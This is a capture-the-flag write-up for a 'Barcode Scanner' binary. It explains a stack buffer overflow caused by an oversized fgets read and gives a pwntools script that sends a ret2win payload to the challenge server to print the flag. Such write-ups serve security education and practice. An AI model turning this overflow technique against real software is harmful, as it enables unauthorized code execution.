# Barcode Scanner

## Security
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

Since we are given source code to work with, we can examine it to see any vulnerabilities. Doing so we can immediately see that a `win()` function is present. 

```c
void win() {
    
    char contents[FLAG_SIZE] = {0};

    
    FILE *fd = fopen("flag.txt", "r");
    if (fd == NULL) {
        perror("failed to read flag from disk");
        exit(1);
    }

    
    fread(contents, 1, sizeof(contents), fd);

    
    printf("[ShoppyMcShopface] Found internal product: %s\n", contents);
}
```

Furthermore, we can see that the program reads <span style="color: blue">READ_SIZE<span> bytes of data into a <span style="color: blue">BUFFER_SIZE<span> sized buffer.

```c
char buffer[BARCODE_LEN] = {0};

printf("[ShoppyMcShopface] enter barcode for lookup: ");
fgets(buffer, READ_SIZE, stdin);
```

Since <span style="color: blue">READ_SIZE<span> is 8 times the size of <span style="color: blue">BUFFER_SIZE<span>, we have a simple buffer overflow exploit.

```c
#define BUFFER_SIZE 0x40
#define READ_SIZE (BUFFER_SIZE * 8)
```

The buffer is defined first in vuln, so its offset from the saved return address will be the size of the buffer + 8 bytes, due to the saved RBP address. From Ghidra, the address of `win()` is `0x40121a`, which gives us the final part of our payload. Note that the actual address used in the payload is slightly off from the starting address of `win()` in order to align the stack properly.
```py
payload = flat({0x48:p64(0x40121f)})
```

Sending this to the server gives us the flag.

## Script
```py
from pwn import *

p = remote('0.cloud.chals.io', 18158)

input()
payload = flat({0x48:p64(0x40121f)})
print(payload)
p.sendline(payload)


p.interactive()
```
